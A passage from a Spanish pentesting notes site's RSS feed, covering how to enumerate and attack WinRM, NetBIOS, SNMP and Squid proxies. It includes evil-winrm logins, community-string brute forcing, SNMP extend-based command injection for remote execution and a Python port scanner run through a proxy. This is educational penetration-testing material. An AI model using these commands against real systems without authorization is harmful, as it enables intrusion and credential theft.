Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-smb-445-(server-message-block).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. SMB 445 - (Server Message Block).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 13 Aug 2024 14:59:24 GMT</pubDate></item><item><title><![CDATA[WinRM - (Windows Remote Management)]]></title><description><![CDATA[ 
 <br><br>La Administración remota de Windows o WinRM es la implementación de Microsoft del protocolo WS-Management, que es un protocolo estándar basado en el Protocolo Simple de Acceso a Objetos (SOAP), que permite la interoperación entre hardware y sistemas operativos de diferentes proveedores.<br><br><br>De cara a auditorias de seguridad, puede ser que nos encontremos trás realizar, por ejemplo, una <a data-href="Enum. LDAP 389 &amp; 636 - ( Lighweight Directory Access Protocol )" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-ldap-389-&amp;-636-(-lighweight-directory-access-protocol-).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. LDAP 389 &amp; 636 - ( Lighweight Directory Access Protocol )</a> con usuarios que forman parte del Remote Management Users, siendo los usuarios pertenecientes a este grupo quienes pueden concetarse a través de herramientas como evil-winrm para conseguir <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br>En caso de que contemos con credenciales, podríamos validar si estas son válidas con herramientas como crackmapexec<br>crackmapexec winrm -u "{username}" -p "{password}" {target_ip}
Copy<br>En caso de que obtengamos un Pwned quiere decir no solo que las credenciales con la que contamos son válidas, si no también de que el usuario pertenece al grupo Remote Management Users. Puediendonos conectarnos así con estas de manera remota a nuestro equipo víctima.<br>evil-winrm -i {target_ip} -u "{useranme}" -p "{password}" 
Copy<br><br><br>El propósito de configurar WinRM para HTTPS es cifrar los datos que se envían a través de la conexión. HTTPS de WinRM requiere un certificado de autenticación de servidor del equipo local con un CN que coincida con el nombre de host que se va a instalar. El certificado no debe expirar, revorcase ni ser autofirmado.<br>En auditorias en las cuales contamos por ejmplo con el puerto 5986, en donde intuimos que se trata de WinRM haciendo uso de HTTPS, sabemos que necesitamos un certificado, por lo que en caso de no haber dado con este, podríamos (En caso de que tengamos una web HTTP o HTTPS y que sea un IIS) hacer uso de wordlists como /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt para enumerar la web y en el mejor de los casos, dar con un certificado.cer.<br>Por ejemplo, supongamos que la página expuesta expone Microsoft Active Directory Certificate Services (AD CS) es un rol de Windows Server que permite el uso y manejo de infraestructura Public Key. De esta manera podríamos crear una clave privada a la par que la solicitud de un certificado.<br>openssl req -newkey rsa:2048 -nodes -keyout {user}.key -out {user}.csr
Copy<br>De esta manera, tendriamos para un determinado usuario, su clave privada en el archivo .key y la solicitud del certificado en el archivo .csr en donde haciendo uso de este último podríamos solicitar la clave pública al AD CS. <br>cat {user}.csr | xclip -sel clip
Copy<br>Una vez pegado en el creador del ceritficado, lo podremos descargar y una vez descargado conectar mediante evil-winrm haciendo uso de ssl. <br>evil-winrm -S -c {file_donwloaded}.cer -k {user}.key -i {target_ip} -u '{username}' -p '{password}'
Copy<br>Una vez introducido este comando, nos conectariamos de manera remota haciendo uso de WinRM a través de HTTPS.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-winrm-5985-(windows-rremote-management).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. WINRM 5985 - (Windows Rremote Management).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:16:34 GMT</pubDate></item><item><title><![CDATA[UDP (User Datagram Protocol)]]></title><description><![CDATA[ 
 <br><br>
<br>
No Orientado a la Conexión: A diferencia de TCP, UDP es un protocolo no orientado a la conexión. Envía datagramas (paquetes de datos) sin establecer una conexión previa.

<br>
Rápido y Ligero: UDP es más rápido y tiene menos sobrecarga que TCP, ya que no verifica la llegada de paquetes ni mantiene el orden de los mismos.

<br>
Uso en Aplicaciones: Ideal para aplicaciones donde la velocidad es crucial y se pueden tolerar algunas pérdidas de datos, como juegos en línea, streaming de video y voz sobre IP (VoIP).

]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/0.-udp.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/UDP/0. UDP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:17:24 GMT</pubDate></item><item><title><![CDATA[NetBIOS]]></title><description><![CDATA[ 
 <br><br>NetBIOS (Network Basic Input/Ouput System) es una API que mejora las capacidades de comunicación en una LAN y permite a las aplicaciones en diferentes equipos comunicarse dentro de la misma red. Facilita la comunicación entre dispositivios y el manejo de transmisión de datos a través de la red.<br><br>Esta funcionalidad de NetBIOS es utilizada para identificar dispositiovs de red (Tiene hasta 15 caracteres), permite el registro y resolución de nombre de dispositivos, asegurando que cada dispositivo pueda ser identificado de forma única dentro de la red.<br><br>Este serivicio maneja el envío de breves mensajes (Datagrams) a través de la network, a su vez, este es un servicio connectionless, es decir que no requiere de establecer una sesión previamente al envío de datos, similar a como funciona <a data-href="0. UDP" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/0.-udp.html" class="internal-link" target="_self" rel="noopener nofollow">0. UDP</a>. <br><br>Establece una conexión orientada a la comunicación entre dos dispositivos, este servicio maneja la creación, mantenimineot y finalización de una sesión, asegurando que los datos hayan sido transmitidos de manera confiable<br>Este protocolo suele usarse en algunos caso como:<br>
<br>Windows Networking: NetBIOS a sido ampliamente utilizado en porotoclos de networking de Microsoft, especialmente en versiones antiguas de sistemas operativos Windows. Fue un componente fundamental en la suite de protocolos de red de Microsoft.
<br>File and Printer Sharing: NetBIOS permite compartir archivos e impresoras en un entorno de red, habilitando un fácil acceso y colaboración.
<br>Legacy Systems: Mientras las redes modernas hacen uso de protocolos más avanzados, NetBIOS sigue siendo relevante para mantener la compatibilidad con sistemas y software más antiguos.
<br>NetBIOS puede ser vulnerable a varias amenazas de seguridad, como name spoofing y unauthorized access, debido a su naturaleza de transmisión y falta de cifrado.<br><br><br>Para enumerar el protocolo NetBIOS, podremos seguir guías de enumeración conocidas com la de <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios" target="_blank">HackTricks</a> u otras, en donde se nos indicará información relevante para llevar a cabo distintos ataques de ser posible o procesos de enumeración.<br>En este caso, referido a NetBIOS-NS (137/udp)...<br>PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
Copy<br> Podremos hacer uso de herramientas como nmblookup, nbtscan y <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>. <br>
<br>nmblookup
<br>nmblookup -A {target_IP}
Copy<br>
<br>nbtscan
<br>nbtscan {IP}/{CIDR}
Copy<br>
<br><a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>
<br>sudo nmap -sUV -T4 --script nbstat.nse -p{port/137} -Pn -n {target_IP}
Copy<br>En lo que a NetBIOS-DGM (138/udp) respecta...<br>PORT    STATE         SERVICE     VERSION
138/udp open|filtered netbios-dgm
Copy<br>Como vimos, permite la comunicación sin la necesidad de concretar una conexión, lo que lo vuelve menos útil para la enumeración o explotación, dado que la filtración de información no es muy poco probable ya que su uso es transmitir datos.<br>Por otro lado, en lo que a NetBIOS-SSN (139/tcp) respecta...<br>PORT      STATE SERVICE      VERSION
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
Copy<br>Como vimos, maneja una sesión orientada a la comunicación entre dos dispositivios, aunque puede ser utilizado para explotar vulnerabilidades en el protocolo SMB (<a data-href="Enum. SMB 445 - (Server Message Block)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-smb-445-(server-message-block).html" class="internal-link" target="_self" rel="noopener nofollow">Enum. SMB 445 - (Server Message Block)</a>), que también utiliza el puerto 139, esto dado que suele verse bajo este puerto cuando se hace uso de SMB over NetBIOS, parte de la implementación de el viejo NetBIOS a través de la implementación TCP/IP, en cambio SMB en puerto 445 es utilizado directamente a través de TCP/IP sin la necesidad de NetBIOS (Implementación más moderna). Hoy en día la realidad es que las técnicas de pentesting actuales se centran directamente en este protocolo.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/enum.-netbios-137.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/UDP/Enum. NetBIOS 137.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:16:19 GMT</pubDate></item><item><title><![CDATA[Enum. SNMP 161 (Simple Network Management Protocol)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>El Protocolo Simpe de Administración de Red o SNMP (Simple Network Management Protocolo) es un porotocolo de capa de aplicación para el intercambio de información de gestión entre dispositivos de red. Este protocolo es uno de los protocolos ampliamente aceptados para gestionar y monitorear los elementos de la red. La mayoría de los elementos de la red de grado profesional vienen con el paquete de agente del SNMP. Esto agentes deben ser habilitados y configurados para cominucarse con el sistema de gestión de la red. <br>Los componentes básicvos de SNMP son:<br>
<br>Administrador de SNMP
<br>Dispositivos gestionados 
<br>Agente SNMP
<br>Base de datos de información de gestión también llamada base de información de gestion (MIB)
<br><br><br>Un administrador o sistema de gestipón es una entidad separada que se encarga de comunicarse con los dispositivos de red implementados por el agante del SNMP. Por lo general, se trata de una computadora que se utiliza para ejecutar uno o mś sistemas de gestión de redes. <br>Funciones claves: <br>
<br>Consultar a los agentes
<br>Recibir respuestas de los agentes 
<br>Establecer variables en los agentes 
<br>Reconocer los eventos asincrónicos de los agentes 
<br><br><br>Un dispositvio gestionado o el elemento de red es una parte de la red que requiera algún tipo de monitorizacion y gestión, por ejemplo, routres, switches, servidores, estaciones de trabajo, impresoras, UPS, etc. <br><br><br>El agente es un programa que está empaquetado dentro del elemento de la red. La habilitación del agente le permite recopilar la base de datos de información de gestión del dispositivo localmente y la pone a disposición del administrador de SNMP, cuando éste la solicita.<br>Funciones clave del agente del SNMP: <br>
<br>Recopila información de gestión sobre su entorno local.
<br>Almacena y recupera la información de gestión según se define en el MIB.
<br>Señala un evento al administrador. 
<br>Actúa como un proxy para algṕun nodo de la red no gestionable de SNMP. 
<br><br><br>Cada agente de SNMP mantiene una base de datos de información que describe los parámetros del dispositivo gestionado. El administrador de SNMP utiliza esta base de datos para solicitar al agente información específica y además traduce la información según sea necesario para el sistema de gestión de la red. <br><br><br>Algo a tener en cuenta para la enumeración de el servicio SNMP son las famosas Community Strings, las cuales son una forma de atutenticación y control de acceso básico utilizada en este protocolo para acceder y gestionar dispositivos de red. Una community string en SNMP es esencialmente una contraseña o clave compartida que permite a uns sistema de gestión de red comunicarse con dispositvios administrados.<br><br>Para descubrir la Community string usada, podríamos hacer uso del archivo /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt para realizar fuerza bruta con una herramienta llamada onesixtyone para posteriormente intentar enumerar información del servicio SNMP con otra herramienta llamada snmpwalk (Esta tardará bastante) o snmpbulkwalk (Está listará la información de una manera más rapida). <br>onesixtyone {target_ip} -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
Copy<br>Una vez obtenida la Community string podríamos intentar enumerar información del equipo. <br>snmpwalk -v2c -c {community_string} {target_ip}
Copy<br>A tener en cuenta que para que el output de esto se vea de una manera más legible, podríamos retocar el archivo /etc/snmp/snmp.conf e instalar el paquete snmp-mibs-downloader. <br>sudo apt install snmp-mibs-downloader

nano /etc/snmp/snmp.conf
# Comentar la línea 4 que dice 
mibs : 
Copy<br><br><br>De cara a auditorias, algo que nos podría interesar sería el leer procesos que podrían estar corriendo. <br>snmpwalk -v2c -c {community_string} {target_ip} hrSWRunName 
# Output: 
# HOST-RESOURCES-MIB::hrSWRunName.711 = STRING: "python"
Copy<br>Una vez obtenido procesos, podríamos intentar listar más información de dichos procesos, usando de ejemplo el caso anterior, deberíamos hacer uso del PID 711. <br>snmpwalk -v2c -c {community_string} {target_ip} hrSWRunTable | grep "711"
Copy<br>De esta manera  podríamos abusar de información que podría llegar a listarse de esta manera, por ejemplo si detectamos un puerto abierto con (Python BaseHTTPServer) podría ser el caso de que este server se este levantado desde un oneliner haciendo uso de la terminal, lo que supondría un riesgo ya que en caso de estar expuesto el servicio SNMP podríamos llegar a obtener información sensible.<br>snpwalk -v2c -c {community_string} {target_ip} hrSWRunTable  | grep "711"
#HOST-RESOURCES-MIB::hrSWRunIndex.711 = INTEGER: 711
#HOST-RESOURCES-MIB::hrSWRunName.711 = STRING: "python"
#HOST-RESOURCES-MIB::hrSWRunID.711 = OID: SNMPv2-SMI::zeroDotZero
#HOST-RESOURCES-MIB::hrSWRunPath.711 = STRING: "python"
#HOST-RESOURCES-MIB::hrSWRunParameters.711 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
#HOST-RESOURCES-MIB::hrSWRunType.711 = INTEGER: application(4)
#HOST-RESOURCES-MIB::hrSWRunStatus.711 = INTEGER: runnable(2)
Copy<br>En este ejemplo podemos ver que al estar ejecutandose el proceso desde consola se nos lista información sensible como usuario y contraseña, asi como un directorio de trabajo, etc. <br><br><br>En casos que nos enfrentemos a un escenario en donde tengamos una máquina la cual no tenga muchos puertos abiertos, no sepamos que hacer y tenga el SNMP abierto, podríamos intentar conseguir la IPv6 de la máquina para analizar los puertos a travéz de IPv6 ya que internamente podrían existir reglas de firewall que bloqueen puertos de cara a la IPv4. <br># Enumerar IPv6 de la máquina victima
snmpwalk -v2c -c {community_string} {target_ip} ipAddresstype

# Outpu:
# IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:97:ef" = INTEGER: unicast(1)

Copy<br>Una vez obtenida una IPv6 (de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:97:ef) podríamos retocar esta de manera correcta: <br><br>Y una vez tengamos el formato correcto de la IPv6 es importante tener en cuenta que los '0' se pueden eliminar:<br><br>Una vez tengamos la IPv6 podríamos hacer uso de herramientas como ping6 para ver si existe traza con dicha IP. <br>ping6 -c 1 dead:beef::250:56ff:feb9:97ef
Copy<br>De esta manera podríamos realizar un escaneo con <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> por IPv6 y ver si los puertos son distintos. <br>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -6 dead:beef::250:56ff:feb9:97ef -oG allPortsv6
Copy<br><br><br><br>Como sabemos, de cara a una auditoría lo que siempre buscamos es un escenario en el cual contemos con <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>, en este caso existen potenciables maneras de lograr esta abusando de SNMP. <br><br>Podríamos intentar inyectar un comando de la siguiente manera: <br>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {community_string} {target_ip} \
    'nsExtendStatus."evilcommand"'  = createAndGo \
    'nsExtendCommand."evilcommand"' = /bin/echo \
    'nsExtendArgs."evilcommand"'    = 'hello world'
Copy<br>En caso de que logremos inyectar el comando de manera exitosa, podríamos ver la ejecución de este:<br>snmpwalk -v2c -c {community_string} {target_ip} NET-SNMP-EXTEND-MIB::nsExtendObjects
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/enum.-snmp-161-(simple-network-management-protocol).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/UDP/Enum. SNMP 161 (Simple Network Management Protocol).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:15:41 GMT</pubDate></item><item><title><![CDATA[<a data-href="Nmap" href="notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> export information]]></title><description><![CDATA[ 
 <br><br>Como sabemos, la herramienta <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> es una herarmienta muy utilizada en la fase de reconocimiento de puertos pero algo que es muy útil de esta herramienta es su funcionalidad para exportar los hallazgos realizados, estos pueden ser exportados en múltiples formatos, dentro de ellos xml el cual nos puede ser de mucha ayuda para combinar con herramientas cmoo xsltproc.<br><br><br>La herramienta de línea de comandos xsltproc se utiliza para procesar transformaciones XSLT (Extensibel Stylesheet Language Transformations). XSLT es un lenguaje para transformar documentos XML en otros formatos, como HTML, texto plano o incluso otros documentos XML.<br>Haciendo uso de esta herramienta y de la funcionalidad de Nmap para exportar los hallazgos en formato xml, podremos crear una web para ver de manera mucho más detallada y legible los hallazgos de nmap, sirviendonos así incluso para presentar como evidencia a clientes en futuros reportes.<br>Escaneo de nmap exportando los hallazgos en formato xml:<br>nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001 -sCV {target_IP} -oX portsInfo.xml
Copy<br>Una vez exportada la información a un archivo xml, haciendo uso de la herramienta xsltproc podremos convertir dicha información en un archivo html para finalmente levantar un simple servidor web y poder visualizar los hallazgos de una manera mucho más legible y presentable:<br>xsltproc portsInfo.xml &gt; index.html
Copy<br>Levantar servidor web simple:<br>python3 -m http.server 80
Copy<br>Finalmente, si nos dirigimos al localhost veremos algo como lo siguiente:<br><img alt="xsltproc_stdout_html_web.png" src="https://dobliuw.com/lib/media/xsltproc_stdout_html_web.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/nmap-evidence-in-a-simple-http-server.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/Nmap evidence in a simple HTTP server.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:01:02 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/xsltproc_stdout_html_web.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/xsltproc_stdout_html_web.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Enumeración y explotación de SQUID Proxies]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a>
<br><br><br>El squid proxy es un servidor web proxy-caché con licencia GPL cuyo objetivo es funcionar como proxy de la red y también como zona caché para almacenar páginas web, entre otros. Se trata de un servidor situado entre la máquina del usuario y otra red (a menudo internet) que actúa como protección separando de las dos redes y como zona caché para acelerar el acceso a páginas web o poder restringir el acceso a contenidos. <br>La función de un sercidor proxy es centralizar el tráfico de una red local hacia el exterior (Internet). Sólo el equipo que incorpora el servicio proxy debe disponer de conexión a internet y el resto de equipos salen a tracés de él:<br><img alt="proxy.png.png" src="https://dobliuw.com/lib/media/proxy.png.png" style="width: 1300px; max-width: 100%;"><br>Ahora bien, puede darse el caso en el que un servidor squid proxy se encuentre mal configurado, permitiendo en consecuencia a los atacantes recopilar información de dispositivos a los que normalmente no deberían tener acceso. <br>Por ejemplo, en este tipo de situaciones, un atacante podría ser capaz de realizar peticiones a direcciones IP internas pasando sus consultas a través del squid proxy, pudiendo así realizar un escaneo de puertos contra determinados servidores situados en una red interna. <br>Para ello, simplemente se podría hacer uso de extensiones de navegador como FoxyProxy o desde consola haciendo uso del comando curl: <br>curl --proxy http://{ip_proxy}:{port_proxy} http://{ip}:{port}
Copy<br>En el mejor de los casos, si la conexión no requiere de autenticación, podríamos llevar a cabo una enumeración de puertos en servidores internos concretos. En caso de requerir autenticación, si el atacante dispone de las credenciales ,estas podrían ser especificadas haciendo uso del parámetro -u. <br>Todo esto es posible debido a que el proxy actúa como intermediario entre la red local y la externa, lo que en parte permite el acceso a ciertos recursos internos qeu normalmente no estarían disponibles desde el exterior. <br>Es importante tener en cuenta que el acceso a estos recursos a través del proxy puede estar restringido por políticas de seguridad, autenticación u otros mecanismos de control de acceso. Además, si el proxy está configurado correctamente, es probable que no permita el acceso a recursos internos desde el exterio, incluso si está pasando a través de él.<br><br><br>Una de las herramientas que se suelen emplear para enumerar puertos de un servidor concreto pasando por el squid proxy es Spose. <br>Como mencionamos anteriormente, para utilizar el proxy podriamos hacer uso de FoxyProxy o mismo el comando curl: <br>curl --proxy http://&lt;proxy_ip&gt;:&lt;proxy_port&gt; http://&lt;ip&gt;:&lt;port&gt; 

# En caso de necesitar utilizar credenciales
curl --proxy 'http://{username}:{password}@&lt;proxy_ip&gt;:&lt;proxy_port&gt;' http://&lt;ip&gt;:&lt;port&gt;
Copy<br>Si estuviera el puerto 80 abierto, podríamos realizar <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> de enumeración como goBuster o Wfuzz: <br>gobuster dir --help | grep -i proxy 

gobuser dir --proxy http://&lt;proxy_ip&gt;:&lt;proxy_port&gt; -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&lt;ip&gt;:&lt;port&gt; -t 20 

# En caso de necesitar utilizar credenciales 
gobuser dir --proxy 'http://&lt;username&gt;:&lt;password&gt;@&lt;proxy_ip&gt;:&lt;proxy_port&gt;' -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&lt;ip&gt;:&lt;port&gt; -t 20 
# En caso de que arroje error, poner los caracteres especiales (Por ejemplo de la password) en url encode (man ascii)
Copy<br>También podriamos crear un script en python para realizar un descubrimiento de puertos internos como por ejemplo: <br>#!/usr/bin/python3 

import sys, signal, requests 

# Ctrl + C 

def ctrl_c(sig, frame): 
    print("\ņ\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global Vars 

top_101_commouns_ports = {
    21, 22, 23, 25, 53, 80, 110, 115, 118, 119, 143, 156, 161, 194, 220, 389,
    443, 445, 465, 514, 515, 530, 543, 544, 548, 554, 587, 631, 636, 873, 989,
    990, 993, 995, 1080, 1099, 1433, 1521, 1701, 1723, 1883, 1900, 2082, 2083,
    2181, 2222, 2375, 2376, 3306, 3389, 3689, 3690, 3780, 4333, 4444, 4500, 4567, 
    4899, 5000, 5001, 5060, 5432, 5672, 5900, 5984, 6379, 6443, 6789, 6881, 8080, 
    8081, 8443, 8888, 9100, 9200, 9418, 9999, 11211, 27017, 27018, 27019, 28017, 
    50000, 50070, 50075, 50090, 61616, 8088, 9000, 9001, 9092, 9201, 9300, 10000, 
    11210, 11211, 27015, 27016, 27020, 28015, 28016, 48010, 48011, 48012, 48013, 
    48014
}

url = "http://127.0.0.1"
squid_proxy = {'http': 'http://192.168.1.34:3128'}

# Bin 

def port_discovery(): 
    for port in top_101_commouns_ports: 
        r = requests.get(url + ':' + str(port), proxies=squid_proxy)
    
        if r.status_code != 503: 
            print("(+) Port %d OPEN." % port)

if __name__ == "__main__":
    port_discovery() 

Copy<br>Otra cosa a tener en cuenta es que podríamos hacer uso de la herramienta proxychains para realizar esto, haciendo uso del archivo de configuración de /etc/proxychains4.conf podríamos indicar un strict_chain para configurar un proxy de tipo http con su respectiva ip y puerto. De manera que haciendo esto, posteriormente podríamos hacer uso de la herramienta proxychains para apuntar al localhost. <br>proxychains -q nmap -Pn -sT --open -T5 -n -v 127.0.0.1 
Copy<br>Algo que puede ser importante a tener en cuenta en algunas ocaciones, es que podríamos obligar al flujo de conexiones a pasar por la propia interfaz del squid proxy para intentar tener conexión con servicios o dispositivos que tal vez no logramos tener. Es decir, en el archivo /etc/poroxychains4.conf puede ser buena ídea agregar la línea http 127.0.0.1 3128 para obligar al flujo de conexiones a pasar por la porpia interfaz del squid proxy, quedando el flujo de conexiones de la siguiente manera. <br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/enumeración-y-explotación-de-squid-proxies.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Enumeración y explotación de SQUID Proxies.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 10 Jun 2024 13:13:05 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/proxy.png.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/proxy.png.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Enumeración y explotación de WebDAV]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
